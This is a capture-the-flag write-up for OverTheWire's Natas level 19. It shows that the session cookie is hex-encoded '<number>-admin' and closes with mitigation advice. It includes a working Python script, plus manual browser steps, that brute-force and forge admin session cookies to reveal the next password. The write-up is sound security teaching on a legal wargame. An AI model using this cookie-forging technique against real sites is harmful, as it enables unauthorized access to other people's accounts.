# Natas Level 19 — Writeup

**Challenge:** [OverTheWire Natas Wargame](http://natas.labs.overthewire.org/)
**Level:** natas18 → natas19
**Category:** Session ID Brute Forcing / Weak Encoding (Obfuscation ≠ Security)

## Objective

Find the password for `natas20` by exploiting the session management on the `natas19` login page, a direct follow-up to natas18, but with an extra twist.


## Recon

Natas19 looks and behaves exactly like natas18: logging in normally shows the same

```
You are logged in as a regular user. Only admin can see the password, and that is not you.
```

message, and the app again relies on a `PHPSESSID` cookie to decide whether you're a "regular user" or "admin".

The difference from natas18 becomes clear when you inspect the actual cookie value in the browser. In natas18, `PHPSESSID` was a **plain sequential integer** (`1`, `2`, `3`, ...). In natas19, the cookie value looks like a long string of **hex-looking gibberish**, e.g. something like:

```
33352d61646d696e
```

This looks random at first glance but it isn't. The level hint (and the challenge description itself) tells you the developers "learned their lesson" from natas18 and tried to make session IDs "more secure" by encoding them. In reality, they just **obfuscated the same weak scheme** instead of fixing it.


## The Vulnerability — Same Bug, New Disguise

Decoding that hex string reveals the trick:

```
33 35 2d 61 64 6d 69 6e
 3  5  -  a  d  m  i  n
```

So `33352d61646d696e` is just the **hex-encoding of the ASCII string** `"35-admin"`.

In other words, the session ID is still built from the **same predictable pattern as natas18** a small sequential user ID, followed by a literal `-admin` suffix except now the whole thing is run through hex encoding before being sent as the cookie value.

This is a classic example of **security through obscurity**: encoding (hex, base64, etc.) is *not* encryption and provides **zero real protection** it's trivially reversible by anyone who looks at it. The developers changed the *appearance* of the session ID, but the underlying weakness (a guessable numeric ID + a hardcoded `-admin` string) is unchanged.

### Key difference from Natas18

|                     |             **Natas18**             |                            **Natas19**                                       |
|       ---           |                ---                  |                               ---                                            |
| Session ID format   | Plain integer (`1`, `2`, `3`...)    | Hex-encoded string of `"<number>-admin"`                                     |
| Obfuscation         |                None                 | Hex encoding (cosmetic only)                                                 |
| Underlying weakness | Predictable small integer keyspace  | **Same** predictable integer keyspace, just hidden behind encoding           |
| Exploit technique   | Iterate raw integers as cookie      | Iterate integers, **hex-encode `"<number>-admin"`** before sending as cookie |
| Real security added |                 —                   | **None** — encoding ≠ authentication/authorization control                   |

So the "fix" the natas developers applied between levels 18 and 19 didn't actually fix anything — it just added one extra step (encoding) to the attacker's script. The vulnerability class (predictable, guessable session identifiers) is identical.


## Script Used

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas19', 'natas19_password')

MAX = 640
count = 1

u = "http://natas19.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    numberAsHex = "".join("{:02x}".format(ord(c)) for c in str(count))
    adminPortion = "2d61646d696e"   # hex for "-admin"

    sessionID = "PHPSESSID=" + numberAsHex + adminPortion
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")
```

### How it works, line by line

1. **`basicAuth`** — handles the level's HTTP Basic Auth using the natas19 site-wide credentials.
2. **`numberAsHex = "".join("{:02x}".format(ord(c)) for c in str(count))`**
   Converts the current guessed user ID (e.g. `35`) into its **hex representation, character by character**. Since `str(count)` gives the digits as text (e.g. `"35"`), each character (`'3'`, `'5'`) is converted to its ASCII hex code (`33`, `35`) and joined — producing `"3335"`.
3. **`adminPortion = "2d61646d696e"`**
   This is the **precomputed hex encoding of the literal string `"-admin"`** (`2d`=`-`, `61`=`a`, `64`=`d`, `6d`=`m`, `69`=`i`, `6e`=`n`). It's hardcoded because it never changes — only the numeric user ID part changes per guess.
4. **`sessionID = numberAsHex + adminPortion`**
   Concatenates both hex chunks to reconstruct what the server expects for an admin session — e.g. for user `35` this becomes `33352d61646d696e`, which decodes back to `"35-admin"`.
5. The script then **brute-forces `count` from `1` to `640`**, building this encoded cookie value each time and sending it as `PHPSESSID`, exactly like the natas18 attack — just with an extra encoding step baked into cookie construction.
6. As soon as a request doesn't return the "regular user" message, the full response (which — since `?debug` is appended to the URL — includes the `natas20` password) gets printed.


## Manual Verification (Browser Method)

Just like in natas18, once the script identifies the working session, you can verify it by hand:

1. Open **DevTools → Application tab → Cookies** on the natas19 page.
2. Replace the `PHPSESSID` value with the **hex string the script found** (e.g. `33352d61646d696e` for user `35`).
3. Refresh the page — it should now load as the **admin session**.
4. Append `?debug` to the URL — the debug output on the page will reveal the `natas20` password directly, matching what the script printed.

This proves the same point as the script: the "obfuscated" session ID is not actually protecting anything — anyone who understands the encoding can forge a valid admin cookie by hand.


## Result

By hex-encoding `"<guessed number>-admin"` for every value from `1` to `640` and sending it as the `PHPSESSID` cookie, the script eventually landed on a valid admin session and revealed the `natas20` password in the debug response — confirming that encoding the session ID added no real security over natas18's plain integer scheme.


## Key Takeaways

- **Encoding is not encryption, and it is not access control.** Hex, Base64, URL-encoding, etc. are all trivially reversible — they hide data from a casual glance, not from an attacker who looks even slightly closer.
- **A weak scheme wrapped in obfuscation is still a weak scheme.** The core vulnerability (predictable sequential session identifiers, combined with a literal, guessable `-admin` marker) was never fixed between levels — it was just dressed up.
- **Never encode secrets or authorization-relevant identifiers using reversible encoding as if it were a security control.** If a value determines a privilege level (like "admin" vs "regular user"), it must never be derivable or forgeable by the client — the *server* should track that server-side, tied to a strong, random, unguessable session token.
- This maps to the same underlying weakness as natas18 — `CWE-330: Use of Insufficiently Random Values` — plus an added demonstration of `CWE-656: Reliance on Security Through Obscurity`.


## Mitigation (Defensive Takeaway)

- Use **cryptographically random, high-entropy session tokens** with no embedded/derivable meaning (no user ID, no role name, nothing an attacker could reconstruct).
- Store the **actual authorization state (admin vs regular user) server-side**, in a session store keyed by the random token — never let the client-visible cookie itself encode privilege level in any form, encoded or not.
- Treat any "let's just encode it" fix as a red flag during code review — encoding schemes should only ever be used for data transport/formatting, never as a substitute for authentication or authorization logic.


*Writeup for educational purposes as part of the OverTheWire Natas wargame series.*